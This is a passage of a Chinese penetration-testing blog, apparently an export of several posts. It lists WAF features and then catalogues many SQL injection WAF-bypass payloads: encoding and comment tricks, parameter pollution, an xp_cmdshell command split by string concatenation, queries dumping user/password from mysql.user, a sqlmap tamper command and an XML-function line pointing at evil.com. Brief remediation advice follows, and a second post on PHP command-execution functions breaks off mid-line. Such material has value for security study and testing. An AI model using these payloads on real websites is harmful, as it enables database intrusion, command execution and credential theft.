<p>　快捷设置.Net安全模式，禁止<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/4294.htm">.Net</a>执行系统敏感函数，保障网站安全</p>
</blockquote>
<p><strong>双层防盗链链接模式</strong>　　 </p>
<blockquote>
<p>可以针对不同站点设置防盗链的过滤, 防止图片、桌面、软件、音乐、电影被人引用。如果发现请求者是盗用网站链接, 则自动重定向到错误处理页面</p>
</blockquote>
<p><strong>网站特定资源防下载</strong></p>
<blockquote>
<p>支持对doc、mdb、mdf、myd等特定资源的防下载保护，加入要保护的敏感资料的路径，即可防止敏感资料被下载</p>
</blockquote>
<p><strong>CC**</strong>攻击防护**</p>
<blockquote>
<p>​    自主研发的独特抗攻击算法，高效的主动防御系统可有效防御<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/662394.htm">CC攻击</a>、流量攻击。</p>
</blockquote>
<p><strong>网站流量保护</strong></p>
<blockquote>
<p>支持下载流量控制、下载线程控制。采用独创的线程控制和<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/190232.htm">流量控制</a>技术,大大提高服务器性能, 保护网站流量。</p>
</blockquote>
<p><strong>IP**</strong>黑白名单**</p>
<blockquote>
<p>全IP黑白名单功能允许用户设置个性化的IP信任列表，直接屏蔽或者允许指定IP访问网站。同时，增加iP临时黑名单功能，以及实现了针对某个功能的iP白名单功能。同时，爬虫白名单提供爬虫信任机制，在出现误拦截情况下，允许用户自定义爬虫信任。</p>
</blockquote>
<h2 id="🎃-waf注入绕过检测方法"><a href="#🎃-waf注入绕过检测方法" class="headerlink" title="🎃   waf注入绕过检测方法"></a>🎃   waf注入绕过检测方法</h2><p><img src="/image/waf/1.jpg"></p>
<p><strong>云waf直接找真实ip就可绕过</strong></p>
<h3 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1. 双写绕过"></a>1. 双写绕过</h3><p>• 举例：?id=1</p>
<p>• 访问?id=1 and 1=1 页面报错 1=1，发现and被过滤，这时候尝试使用双写 的方式绕过，如aanndd 1=1，当and被过滤后，aanndd变成了and，所以 这时传输数据库的语句是and 1=1 ，如果当访问 order by 错误信息为‛der by‛这发现过滤了or，这双写or，后面注入和union注入的一致。</p>
<h3 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2. 大小写绕过"></a>2. 大小写绕过</h3><p>• 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式 /express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
<p>• 举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</p>
<p>• 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个 关键字或每种情况都有处理</p>
<h3 id="3-替换关键字"><a href="#3-替换关键字" class="headerlink" title="3. 替换关键字"></a>3. 替换关键字</h3><p>• 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、 union这些关键字，如果只匹配一次就很容易绕过</p>
<p>• 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</p>
<p>• 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT， 不建议对此抱太大期望</p>
<h3 id="4-编码绕过注入"><a href="#4-编码绕过注入" class="headerlink" title="4. 编码绕过注入"></a>4. 编码绕过注入</h3><p>URL编码</p>
<p>访问id=1’,发现页面报出Mysql错误，接着访问id=1 and 1=1 和id=1 and 1=2 时，发现and被拦截，尝试使用URL全编码的方式绕过拦截。由于服务器会 自动对URL进行一次URL编码，所以需要把关键字编码两次，这里需要注意的地方是，URL编码需要选择全编码，而不是普通的URL编码。</p>
<p>如： 关键字and进行两次URL全编码的结果是%25%36%31%25%36%65%25%36%34， 访问id=1 %25%36%31%25%36%65%25%36%34 1=1时，页面返回和id=1相同， 访问id=1 %25%36%31%25%36%65%25%36%34 1=2时，和id=1不同，所以该页面一定存在sql注入漏洞。</p>
<p>后面的注入过程与union注入一致，只需判断过滤的关键词，并经过两次URL 全编码即可。</p>
<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>target.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p>
<p>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p>
<p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码</p>
<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>• Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p>
<p>• 看一下常用的几个符号的一些Unicode编码：</p>
<p>• 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
<p>• 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
<p>• 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
<p>• 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
<p>• 举例：?id=1%D6‘%20AND%201=2%23</p>
<p>• SELECT ‘Ä’=‘A’; #1</p>
<p>• 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成’，那么就变成了%D6%5C’，%D6%5C构成了 一个宽字节即Unicode字节，单引号可以正常使用</p>
<p>• 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode 编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p>
<p>• 另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过， 有兴趣的朋友可以去了解下</p>
<p>• 常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例</p>
<h3 id="5-使用注释"><a href="#5-使用注释" class="headerlink" title="5. 使用注释"></a>5. 使用注释</h3><p>普通注释</p>
<p>• 常见的用于注释的符号： //, – , /**/, #, – +, – - , ; ， – a</p>
<p>• 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</p>
<p>• ‘union%a0select pass from users#</p>
<p>• /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、-+用于终结语句的查询</p>
<p>内联注释</p>
<p>• 相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p>
<p>• 举例：</p>
<p>index.php?page_id=-15 /<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p>
<p>•   ?page_id=null%0A/<strong>//<em>!50000%55nIOn</em>//<em>yoyu</em>/all/</strong>/%0A/<em>!%53eLE ct</em>/%0A/<em>nnaa</em>/+1,2,3,4…</p>
<p>• 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
<h3 id="6-等价函数与命令"><a href="#6-等价函数与命令" class="headerlink" title="6. 等价函数与命令"></a>6. 等价函数与命令</h3><p>某些函数或命令，因为WAF的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们</p>
<h4 id="1-函数或变量"><a href="#1-函数或变量" class="headerlink" title="1.函数或变量"></a>1.函数或变量</h4><p>• hex()、bin() ==&gt; ascii()</p>
<p>• sleep() ==&gt;benchmark()</p>
<p>• concat_ws()==&gt;group_concat()</p>
<p>• mid()、substr() ==&gt; substring()</p>
<p>• @@user ==&gt; user()</p>
<p>• @@datadir ==&gt; datadir()</p>
<h4 id="2-符号"><a href="#2-符号" class="headerlink" title="2.符号"></a>2.符号</h4><p>• and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那便等于了</p>
<p>• 如 id=1 or 1=1 可以换成 id=1 or 1!=2</p>
<p>• 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/</p>
<h4 id="3-生僻函数"><a href="#3-生僻函数" class="headerlink" title="3.生僻函数"></a>3.生僻函数</h4><p>  • MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);         </p>
<p>  • ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>  • SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror)); //postgresql</p>
<p>  • ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>、</p>
<p>• MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的 filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。</p>
<h3 id="7-特殊符号"><a href="#7-特殊符号" class="headerlink" title="7. 特殊符号"></a>7. 特殊符号</h3><p>• 这里把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p>
<p>• 几个例子：</p>
<p>• 1.使用反引号，例如select version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
<p>• 2.神奇的”-+.”，select+id-1+1.from users; ‚+‛是用于字符串连接的，‛-‛和‛.‛ 在此也用于连接，可以逃过空格和关键字过滤</p>
<p>• 3.@符号，select@^1.from users; @用于变量定义如@ var_name ，一个@表示用户定义，@@表示系统变量</p>
<p>• 4.Mysql function() as xxx 也可不用as和空格 select-count(id)test from users; //绕过空格限制</p>
<p>• 发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)： `、~、!、@、%、()、[]、.、-、+ 、|、%00</p>
<h3 id="8-HTTP参数控制"><a href="#8-HTTP参数控制" class="headerlink" title="8. HTTP参数控制"></a>8. HTTP参数控制</h3><p>• 通过提供多个参数=相同名称的值集来混淆WAF。例如 <a href="http://example.com/?id=1&amp;?id=%E2%80%99">http://example.com?id=1&amp;?id=’</a> or ‘1’=’1′ – ‘在某些情况下（例如使用 Apache/PHP），应用程序将仅解析最后（第二个） id= 而WAF只解析第一 个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的WAF都不会受到HTTP参数污染（HPP） 的影响，但仍然值得一试。</p>
<p>• 1.HPP(HTTP Parameter Polution)</p>
<p>• 举例：</p>
<p> /?id=1;select+1,2,3+from+users+where+id=1–</p>
<p>1</p>
<p> /?id=1;select+1&amp;id=2,3+from+users+where+id=1–</p>
<p>1</p>
<p>/?id=1/**/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users</p>
<p>• HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种 情况，不同的Web服务器处理方式如下</p>
<p>2.HPF(HTTP Parameter Fragment)</p>
<p>• 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p>
<p>• 举例：</p>
<p> •  /?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–</p>
<p>1</p>
<p>• select * from table where a=1 union/* and b=/select 1,pass/ limit */from users—</p>
<p>• 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不 一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并 语句。</p>
<p>• 3.HPC(HTTP Parameter Contamination)</p>
<p>• RFC2396定义了如下一些字符：</p>
<p>• Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ’ () Reserved : ; / ? : @ &amp; = + $ , Unwise : { } | \ ^ [ ] `</p>
<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：</p>
<p>以魔术字符%为例，Asp/Asp.net会受到影响</p>
<h3 id="9-缓冲区溢出-Advanced"><a href="#9-缓冲区溢出-Advanced" class="headerlink" title="9. 缓冲区溢出(Advanced)"></a>9. 缓冲区溢出(Advanced)</h3><p>• 缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
<p>• 举例：</p>
<p>  • ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,1 3,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
<p>• 示例0xA*1000指0xA后面‛A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
<h3 id="10-整合绕过"><a href="#10-整合绕过" class="headerlink" title="10. 整合绕过"></a>10. 整合绕过</h3><p>• 整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性， 除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>
<p> • target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/<em>!uNIOn</em>/+/<em>!SeLECt</em>/+1,2,3,4… </p>
<p> • id=1/<em>!UnIoN</em>/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM /<em>information_schema</em>/.tables /<em>!WHERE <em>/+/</em>!TaBlE_ScHeMa</em>/+like+database()– -</p>
<p> • ?id=5+/<em>!UNION</em>/+/<em>!SELECT</em>/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/<em>!INFORMATIO N_SCHEM</em>/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e–</p>
<h2 id="WAF身份认证阶段的绕过"><a href="#WAF身份认证阶段的绕过" class="headerlink" title="WAF身份认证阶段的绕过"></a>WAF身份认证阶段的绕过</h2><p>​    WAF是有一个白名单的，在白名单内的客户请求将不做检测</p>
<h3 id="🧨绕过方法一：伪造搜索引擎（一般不存在）"><a href="#🧨绕过方法一：伪造搜索引擎（一般不存在）" class="headerlink" title="🧨绕过方法一：伪造搜索引擎（一般不存在）"></a><strong>🧨绕过方法一：伪造搜索引擎（一般不存在）</strong></h3><p>老版本的WAF是有这个<a href="https://links.jianshu.com/go?to=http://www.2cto.com/">漏洞</a>的，就是把User-Agent修改为搜索引擎，可以通过火狐修改也可以通过burp修改；我这里用到burp</p>
<p><img src="/image/waf/2.jpg"></p>
<p>将其值设为自己想要的UserAgent（如:Baiduspider）</p>
<p>如果想批量替换User_Agent，</p>
<p><img src="/image/waf/3.jpg"></p>
<h3 id="🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）"><a href="#🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）" class="headerlink" title="🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）"></a>🧨绕过方法二：伪造白名单特殊目录（一般需要开发人员加入白名单，否则不行，以前的默认）</h3><blockquote>
<p>  <strong>360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截</strong></p>
<p>比如：<a href="http://www.spisec.com/pen/news.php?id=1">www.spisec.com/pen/news.php?id=1</a> union select user,password from mysql.user</p>
<p>可以改为:</p>
<p><a href="http://www.spisec.com/pen/news.php/admin?id=1">www.spisec.com/pen/news.php/admin?id=1</a> union select user,password from mysql.user</p>
<p>或者</p>
<p><a href="http://www.spisec.com/pen/news.php">www.spisec.com/pen/admin/..\news.php</a></p>
<p>id=1 union select user,password from mysql.user</p>
</blockquote>
<h3 id="🧨绕过方法三：直接攻击源站"><a href="#🧨绕过方法三：直接攻击源站" class="headerlink" title="🧨绕过方法三：直接攻击源站"></a>🧨绕过方法三：直接攻击源站</h3><blockquote>
<p> 这个方法可以用于安全宝、加速乐等云WAF，云WAF的原理通过DNS解析到云WAF，访问网站的流量要经过指定的DNS服务器解析，然后进入WAF节点进行过滤，最后访问原始服务器，如果我们能通过一些手段（比如c段、社工）找到原始的服务器地址，便可以绕过，这个我也没有找到太好的例子，就不多做说明了。</p>
</blockquote>
<h2 id="🧵WAF数据包解析阶段的绕过"><a href="#🧵WAF数据包解析阶段的绕过" class="headerlink" title="🧵WAF数据包解析阶段的绕过"></a>🧵WAF数据包解析阶段的绕过</h2><h3 id="（1）编码绕过"><a href="#（1）编码绕过" class="headerlink" title="（1）编码绕过"></a>（1）编码绕过</h3><p>最常见的方法之一，可以进行urlencode</p>
<p><img src="/image/waf/4.jpg"></p>
<p>现在一般不行</p>
<hr>
<h3 id="（2）修改请求方式绕过"><a href="#（2）修改请求方式绕过" class="headerlink" title="（2）修改请求方式绕过"></a>（2）修改请求方式绕过</h3><p>很多asp、aspx网站都存在这个问题，一般只防get注入而cookie与post注入不进行过滤防御</p>
<p><img src="/image/waf/5.jpg"></p>
<p>前提是代码接受request请求</p>
<h3 id="（3）复参数绕过"><a href="#（3）复参数绕过" class="headerlink" title="（3）复参数绕过"></a>（3）复参数绕过</h3><blockquote>
<p>例如一个请求是这样的</p>
<p>GET/pen/news.php?id=1 union select user,password from mysql.user</p>
<p>可以修改为</p>
<p>GETpen/news.php?id=1&amp;id=union&amp;id=select&amp;id=user,password&amp;id=from%20mysql.user</p>
<p>很多WAF都可以这样绕，测试最新版WAF能绕过部分语句</p>
</blockquote>
<h3 id="（4）WAF触发规则的绕过"><a href="#（4）WAF触发规则的绕过" class="headerlink" title="（4）WAF触发规则的绕过"></a>（4）WAF触发规则的绕过</h3><p><strong>WAF在这里主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。</strong></p>
<p><strong>绕过策略一：特殊字符替换空格（最新waf会被拦截）</strong></p>
<blockquote>
<p>用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver中可以用/**/代替空格，也可以使用如下方法：</p>
<p><a href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1/*%257C%2523--%2523%257C*/union/*%257C%2523--%2523%257C*/select/*%257C%2523--%2523%257C*/1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1/<em>|%23–%23|</em>/union/<em>|%23–%23|</em>/select/<em>|%23–%23|</em>/1,user(),3,4,5</a></p>
<p><a href="http://192.168.0.142:8080/sql.php?id=1/*%7C%23--%23%7C*/and/*%7C%23--%23%7C*/1=2">http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2</a></p>
</blockquote>
<p><strong>绕过策略二：特殊字符拼接</strong></p>
<blockquote>
<p>把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释/**/来绕过，在mssql中，函数里面可以用+来拼接</p>
<p>如：GET /pen/news.php?id=1;exec(master..xp_cmdshell ‘netuser’)</p>
<p><strong>可以改为：GET /pen/news.php?id=1;exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)</strong></p>
</blockquote>
<p><strong>绕过策略三：注释包含关键字</strong></p>
<blockquote>
<p>在mysql中，可以利用/<em>!</em>/包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。测试最新版本的WAF可以完美绕过。</p>
<p>如: GET /pen/news.php?id=1 union select user,password frommysql.user</p>
<p>可以改为: GET /pen/news.php?id=1 /<em>!union</em>//<em>!select</em>/  user,password /<em>!from</em>/ mysql.user</p>
</blockquote>
<p><strong>绕过策略四：</strong></p>
<p><strong>也可以尝试seelct~ select~1 select! select@等绕过成功，</strong></p>
<h3 id="（5）空格替换法"><a href="#（5）空格替换法" class="headerlink" title="（5）空格替换法"></a>（5）空格替换法</h3><blockquote>
<p>把空格替换成%0a/<strong>/可以绕过最新版本WAF, 在Pangolin中 点击 编辑– 配置– 高级– 选择替换空格使用– 填上%0a/</strong>/即可</p>
<p><a href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1%2520union%2523%250aselect%2523%250a1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5</a></p>
</blockquote>
<p><img src="/image/waf/6.jpg"></p>
<h3 id="（6）使用大小写"><a href="#（6）使用大小写" class="headerlink" title="（6）使用大小写"></a>（6）使用大小写</h3><blockquote>
<p>​    <a href="http://www.***.com/index.php?page_id=-15uNIoN">http://www.***.com/index.php?page_id=-15uNIoN</a> sELecT 1,2,3,4….</p>
</blockquote>
<h3 id="（7）关键字替换"><a href="#（7）关键字替换" class="headerlink" title="（7）关键字替换"></a>（7）关键字替换</h3><blockquote>
<p>​    <a href="http://www.***.com/index.php?page_id=-15UNIunionON">http://www.***.com/index.php?page_id=-15UNIunionON</a> SELselectECT 1,2,3,4….</p>
<p>​    此方法适用于一些会把union</p>
<p>select替换掉的WAF，经过WAF过滤后就会变成union select 1,2,3,4….</p>
</blockquote>
<h3 id="（8）编码与注释结合"><a href="#（8）编码与注释结合" class="headerlink" title="（8）编码与注释结合"></a>（8）编码与注释结合</h3><blockquote>
<p>   <a href="http://www.***.com/index.php?page_id=-15">http://www.***.com/index.php?page_id=-15</a> %55nION/**/%53ElecT 1,2,3,4…</p>
<p><a href="https://links.jianshu.com/go?to=http://192.168.0.142:8080/sql.php?id=1/*!50000*/union/*!50000*/select/*!50000*/1,user(),3,4,5">http://192.168.0.142:8080/sql.php?id=1/<em>!50000</em>/union/<em>!50000</em>/select/<em>!50000</em>/1,user(),3,4,5</a></p>
<p>也可以这样</p>
<p><a href="http://192.11.22.55/sqli/Less-1/?id=1&#39;">http://192.11.22.55/sqli/Less-1/?id=1&#39;</a> and /<em>!1=1</em>/ %23 (WAF不拦截)</p>
<p>​     U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/</p>
<p>手工进行加注释进行注入太慢，一般我们通过Sqlmap这类工具来实现自动注入:</p>
<p>sqlmap.py -u “URL”–tamper=”versionedmorekeywords.py” –dealy=1</p>
</blockquote>
<h3 id="（9）利用WAF本身的功能绕过"><a href="#（9）利用WAF本身的功能绕过" class="headerlink" title="（9）利用WAF本身的功能绕过"></a>（9）利用WAF本身的功能绕过</h3><blockquote>
<p>​     假如你发现WAF会把”*”替换为空，那么你就可以利用这一特性来进行绕过</p>
<p>‍‍‍<a href="http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4">http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4</a>….</p>
<p>其它方法-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select1,2,3,4…)</p>
</blockquote>
<h3 id="（10）使用其他变量或者命令对注入语句进行替换"><a href="#（10）使用其他变量或者命令对注入语句进行替换" class="headerlink" title="（10）使用其他变量或者命令对注入语句进行替换"></a>（10）使用其他变量或者命令对注入语句进行替换</h3><blockquote>
<p>COMMAND | WHAT TO USE INSTEAD</p>
<p>@@version | version()</p>
<p>concat() | concat_ws()</p>
<p>group_concat() | concat_ws()</p>
<p>= | like</p>
</blockquote>
<p>  这种在实际绕过WAF过程中很有作用，如下实例:</p>
<p><img src="/image/waf/7.jpg"></p>
<p><a href="http://172.16.20.18:8080/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20/*!%09SELECT*/%20user(),database()+--+&amp;Submit=Submit">http://172.16.20.18:8080/dvwa/vulnerabilities/sqli/?id=1%27%20%55%4e%49%4f%4e%20/*!%09%53%45%4c%45%43%54*/%20user(),database()+--+&amp;Submit=Submit</a></p>
<h2 id="waf常见特征"><a href="#waf常见特征" class="headerlink" title="waf常见特征"></a>waf常见特征</h2><p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p>
<p>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p>
<p>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p>
<p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p>
<h2 id="waf常见特点"><a href="#waf常见特点" class="headerlink" title="waf常见特点"></a>waf常见特点</h2><p>• 异常检测协议：拒绝不符合HTTP标准的请求</p>
<p>• 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p>
<p>• 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题</p>
<p>• 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p>
<p>• 状态管理：重点进行会话保护</p>
<p>• 另还有：Cookie保护、抗入侵规避技术、响应监视和信息泄露保护等</p>
<h2 id="WAF的识别扫描器"><a href="#WAF的识别扫描器" class="headerlink" title="WAF的识别扫描器"></a>WAF的识别扫描器</h2><p>• 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix 在内的标识</p>
<p>• 单IP+ cookie某时间段内触发规则次数</p>
<p>•隐藏的链接标签等</p>
<p>•Cookie植入</p>
<p>•验证码验证，扫描器无法自动填充验证码</p>
<p>•单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p>
<h2 id="SQL修复建议"><a href="#SQL修复建议" class="headerlink" title="SQL修复建议"></a>SQL修复建议</h2><p>• 常用得SQL注入漏洞得修复方法有两种</p>
<h4 id="•-1-过滤危险字符"><a href="#•-1-过滤危险字符" class="headerlink" title="• 1.过滤危险字符"></a>• 1.过滤危险字符</h4><p>• 多数CMS都采用过滤字符的方式，例如，采用正则表达式匹配union、 sleep、load_file等关键字，如果匹配到，则退出程序。</p>
<h3 id="•-2-使用预编译语句"><a href="#•-2-使用预编译语句" class="headerlink" title="• 2.使用预编译语句"></a>• 2.使用预编译语句</h3><p>• 其实使用PDO预编译语句，需要注意的是，不要将变量直接拼接到PDO语 句中，而是使用占位符进行数据库的增加、删除、修改、查询。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>代码执行与反序列化</title>
    <url>/2020/02/12/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"></p>
<h2 id="远程命令"><a href="#远程命令" class="headerlink" title="远程命令"></a>远程命令</h2><p><strong>执行原理</strong>：应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</p>
<p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p>
<h2 id="远程代码"><a href="#远程代码" class="headerlink" title="远程代码"></a>远程代码</h2><p><strong>执行漏洞原理</strong>：为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p>
<p>​      因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
<h2 id="php执行系统及代码命令常用函数"><a href="#php执行系统及代码命令常用函数" class="headerlink" title="php执行系统及代码命令常用函数"></a>php执行系统及代码命令常用函数</h2><p>1）<strong>执行系统命令:</strong></p>
<p>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号）</p>
<p><a href="https://links.jianshu.com/go?to=http://www.2cto.com/kf/web/php/">PHP</a>执行<a href="https://links.jianshu.com/go?to=http://www.2cto.com/os/">系统</a>命令的有几个常用的函数,如有:system函数、exec函数、popen函数,passthru,shell_exec函数他们都可以执行系统命令,不过前提时必须系统给了权限了哦。</p>
<p><strong>system</strong>函数</p>
<p>说明：执行外部程序并显示输出资料。</p>
<p>语法：string system(string command, int</p>
<p>[return_var]);</p>
<p>返回值: 字符串详细介绍：本函数就像是 C 语中的函数 system(),用来执行指令,并输出结果,若是 return_var 参数存在,则执行 command 之后的状态会填入 return_var 中,同样值得注意的是若需要处理用户输入的资料,而又要防止用户耍花招<a href="https://links.jianshu.com/go?to=http://www.2cto.com/article/jiami/">破解</a>系统,则可以使用 EscapeShellCmd(),若 PHP 以模块式的执行,本函数会在每一行输出后自动更新 Web 服务器的输出缓冲暂存区,若需要完整的返回字符串,且不想经过不必要的其它中间的输出界面,可以使用 PassThru()。</p>
<p> <strong>exec</strong>函数</p>
<p>说明：执行外部程序。</p>
<p>语法：string exec(string command,</p>
<p>string [array], int [return_var]);</p>
<p>返回值: 字符串</p>
<p>详细介绍：本函数执行输入 command 的外部程序或外部指令。它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用PassThru() 这个函数。</p>
<p>要是参数 array 存在，command 会将 array 加到参数中执行，若不欲 array 被处理，可以在执行 exec() 之前呼叫 unset()。若是 return_var 跟 array 二个参数都存在，则执行 command 之后的状态会填入 return_var 中。</p>
<p>值得注意的是若需要处理使用者输入的资料，而又要防止使用者耍花招破解系统，则可以使用EscapeShellCmd()</p>
<p><strong>popen</strong>函数</p>
<p>说明：打开文件。</p>
<p>语法：int popen(string command, string</p>
<p>mode);</p>
<p>返回值: 整数</p>
<p>详细介绍：本函数执行指令开档，而该文件是用管道方式处理的文件。用本函数打开的文件只能是单向的(只能读或只能写)，而且一定要用pclose() 关闭。在文件操作上可使用 fgets()、fgetss() 与 fputs()。若是开档发生错误，返回 false 值。</p>
<p><strong>反撇号</strong>`（和~在同一个键）执行系统外部命令,</p>
<p>代码如下:echo</p>
